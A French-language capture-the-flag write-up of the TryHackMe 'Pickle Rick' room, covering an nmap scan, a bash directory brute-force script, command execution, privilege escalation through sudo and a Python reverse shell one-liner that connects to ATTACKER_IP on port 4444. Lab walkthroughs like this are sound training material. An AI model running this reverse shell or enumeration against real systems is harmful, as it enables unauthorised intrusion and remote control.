# Pickle Rick – Compte rendu

## Contexte

Room : **Pickle Rick**  
Plateforme : **TryHackMe**  
Objectif : Trouver les **3 ingrédients secrets** en compromettant la machine cible.
Contrainte :  
- L’AttackBox TryHackMe n’était plus disponible (limite d’1h atteinte)
- Utilisation d’une machine locale **Arch Linux**
- Connexion via **OpenVPN**

***N.B : pour des raisons evidente les réponse ne seront pas dans le compte rendu.***

---

## 1. Mise en place de l’environnement

### Connexion au VPN TryHackMe

```bash
sudo openvpn eu-west-1-Stiimy-regular.ovpn
```

Vérification de l’interface VPN :

```bash
ip a
```

Interface active :
```
tun0 -> 192.168.229.51
```

---

## 2. Reconnaissance réseau

### Cible

```
IP cible : 10.82.186.26
```

### Scan Nmap

```bash
nmap -sC -sV 10.82.186.26
```

Résultats :

```
22/tcp  open  ssh     OpenSSH 8.2p1
80/tcp  open  http    Apache 2.4.41
```

---

## 3. Enumération Web

### Accès au site

- Page web : `Rick is sup4r cool`
- Inspection du code source HTML

Commentaire trouvé :

```html
<!--
Note to self, remember username!
Username: R1ckRul3s
-->
```

➡️ **Username identifié**

---

## 4. Enumération de répertoires (sans SecLists local)

### Problème rencontré

- SecLists non installé sur Arch
- `pacman -S seclists` indisponible
- `dirb` non disponible via pacman

### Solution : wordlist via wget

Création d’un script bash pour "brute-force" HTTP :

```bash
#!/bin/bash

TARGET="http://10.82.186.26"
WORDLIST="/tmp/common.txt"
OUTPUT="scan_result.txt"

wget -qO- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt > "$WORDLIST"

while read -r p; do
    RESULT=$(wget -S --spider "$TARGET/$p" 2>&1 | grep "HTTP/")
    if [[ ! -z "$RESULT" ]]; then
        echo "[FOUND] $p => $RESULT" >> "$OUTPUT"
    fi
done < "$WORDLIST"
```

### Tri des réponses HTTP 200

```bash
grep "200 OK" scan_result.txt
```

Résultats :

```
index.html
robots.txt
```

---

## 5. Accès initial (Command Execution)

- Exploitation de la page web permettant l’exécution de commandes
- Accès à un shell distant (reverse shell)

---

## 6. Reverse Shell

### Listener sur la machine attaquante

```bash
nc -lvnp 4444
```

### Payload Python utilisé côté cible

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

---

## 7. Stabilisation et reconnaissance locale

```bash
whoami
id
pwd
ls
```

Navigation dans le système de fichiers.

---

## 8. Recherche des ingrédients

### Premier ingrédient
- Trouvé via l’interface web / commandes

### Deuxième ingrédient

Erreur initiale :

```bash
cat second ingredients
```

Correction :

```bash
ls
cat "second ingredients"
```

➡️ Problème dû à l’espace dans le nom du fichier.

---

## 9. Élévation de privilèges

### Vérification sudo

```bash
sudo -l
```

Résultat :
```
(ALL) NOPASSWD: ALL
```

### Passage root

```bash
sudo -i
```

---

## 10. Troisième ingrédient

Indice :
```
Look around the file system for the other ingredient
```

Recherche côté root :

```bash
cd /root
ls
cat *
```

➡️ **Troisième ingrédient trouvé dans /root**

---

## 11. Problèmes rencontrés et solutions

### Problèmes
- Absence de SecLists sur Arch
- Absence de dirb/gobuster prêts à l’emploi
- Mauvaise gestion des fichiers avec espaces
- Reverse shell instable au départ
- Tentative inutile de SSH (clé publique requise)

### Solutions
- Téléchargement direct des wordlists via GitHub
- Scripts bash personnalisés
- Utilisation de `sudo -l` pour escalade rapide
- Focus sur l’objectif CTF (pas de destruction système)

---

## 12. Conclusion

Cette room permet de pratiquer :

- Enumération web
- Analyse de code source
- Brute-force de répertoires
- Reverse shell
- Privilege escalation via sudo
- Navigation système Linux

Approche réaliste, simple et efficace, adaptée aux débutants en pentest.

---

### 13. Preuve reussite
<img width="1827" height="584" alt="image" src="https://github.com/user-attachments/assets/9861a624-3455-4a79-ac3f-c0e4cb691f43" />

>Always trust the Dictator

